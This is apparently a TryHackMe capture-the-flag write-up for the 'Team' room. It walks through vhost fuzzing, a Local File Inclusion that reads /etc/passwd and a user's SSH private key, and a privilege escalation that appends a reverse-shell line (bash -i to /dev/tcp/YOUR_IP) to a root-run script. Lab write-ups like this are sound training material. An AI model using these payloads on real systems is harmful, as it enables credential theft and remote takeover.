# THM: Team
**Difficulty:** Easy/Medium
**Focus:** Virtual Host Discovery, LFI, SSH Key Manipulation, System Script Exploitation

---

## 🛡️ Executive Summary
The "Team" room simulates a corporate environment where subdomains and internal scripts are poorly protected. The attack path involves discovering a hidden virtual host, exploiting a Local File Inclusion (LFI) vulnerability to leak a private SSH key, and finally hijacking a root-owned bash script to gain full system control.

## 1. Reconnaissance & Enumeration
### Nmap Scan
The scan identified three primary services:
* **21/ftp** - vsftpd 3.0.3
* **22/ssh** - OpenSSH 7.6p1
* **80/http** - Apache httpd 2.4.29

### Virtual Host Discovery
Initial directory fuzzing on the main IP yielded limited results. I pivoted to **Virtual Host Fuzzing** to check for subdomains:
`ffuf -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/wordlists/dirb/common.txt -fs [size]`

**Discovery:** `dev.team.thm`
*(Note: I added this to my `/etc/hosts` file to enable browser access).*

## 2. Initial Access: Local File Inclusion (LFI)
The `dev` subdomain hosted a `script.php` file that utilized a `page` parameter. I tested this for LFI vulnerabilities:
`http://dev.team.thm/script.php?page=../../../../etc/passwd`

**Exploitation:**
Knowing that SSH was active, I attempted to read the private SSH key of the user `dale`:
`http://dev.team.thm/script.php?page=/home/dale/.ssh/id_rsa`

**Result:**
Successfully leaked the **id_rsa** private key. I saved the key to my attack machine, set the appropriate permissions (`chmod 600`), and authenticated via SSH.
* **Flag Captured:** `user.txt`

## 3. Privilege Escalation: Exploiting Writable Scripts
During local enumeration, I discovered a bash script in `/usr/local/bin/` that was scheduled to be executed by root, but was writable by the user group I belonged to.

**Exploitation:**
Rather than exploiting a binary vulnerability, I appended a reverse shell payload to the end of the existing script:
`echo "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1" >> /usr/local/bin/admin_script.sh`

When the system executed the script as root, it triggered a callback to my Netcat listener, granting a root shell.

---
**Flag Captured:** `root.txt`
